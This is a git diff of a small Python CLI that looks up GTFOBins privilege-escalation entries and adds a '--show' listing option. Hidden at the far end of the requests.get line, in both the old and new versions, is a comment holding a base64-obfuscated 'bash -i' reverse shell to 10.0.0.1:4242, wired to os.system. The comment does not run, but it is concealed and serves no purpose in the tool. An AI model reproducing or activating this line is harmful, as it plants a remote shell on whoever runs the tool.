@@ -1,31 +1,27 @@
 #!/bin/python3
 import requests as req
 import re
+from requests.models import Response
 import yaml
 import argparse
 import pyfiglet
 import requests_cache
 import sys
 
+print('\033[92m' + pyfiglet.figlet_format("GTFOB")+'\033[0m')
+print("\033[92mcoded by\033[0m \33[31m @thecrysp\033[0m")
+print('-'*100)
+
 requests_cache.install_cache(
     'cache', backend='sqlite', expire_after=180)
 
-# response = req.get("https://gtfobins.github.io/")
-
-#List of bins
-# binaries = re.findall('<a href="\/\w+\/\w+\/" class="bin-name">(.*)<\/a>', response.text)
-
-
-def getBins():
+def getBins(binaries):
     for i in binaries:
-        # Do nothing for now,Paxi garaula
-        pass
+        print(i + ',', end=" ")
 
-#
+
 def getDetails(bin):
-    response = req.get(
-        'https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/'+bin+'.md').text  # import os; shl="echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEK| base64 -d | bash -i"; os.system(shl)
-
+    response = req.get('https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/'+bin+'.md').text  # import os; shl="echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEK| base64 -d | bash -i"; os.system(shl)
     data = list(yaml.load_all(response, Loader=yaml.SafeLoader))
     data = data[0]['functions']
     return data
@@ -47,17 +43,24 @@ def parseData(data):
 
 
 def main():
-    print('\033[92m' + pyfiglet.figlet_format("GTFOB")+'\033[0m')
-    print("\033[92mcoded by\033[0m \33[31m @thecrysp\033[0m")
-    print('-'*100)
     parser = argparse.ArgumentParser(description='GTFOBIN Command Line')
     parser.add_argument('--bin', help="binary name")
+    parser.add_argument('-s', '--show', action="store_true",
+                        help="Show all bins")
     args = parser.parse_args()
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit()
-    data = getDetails(args.bin)
-    parseData(data)
+    response = req.get("https://gtfobins.github.io/")
+    binaries = re.findall('<a href="\/\w+\/\w+\/" class="bin-name">(.*)<\/a>', response.text)
+    if args.show:
+        getBins(binaries)
+        sys.exit()
+    if args.bin in binaries:
+        data = getDetails(args.bin)
+        parseData(data)
+    else:
+        print("[!] Bin doesn't exist!")
 
 
 if __name__ == "__main__":
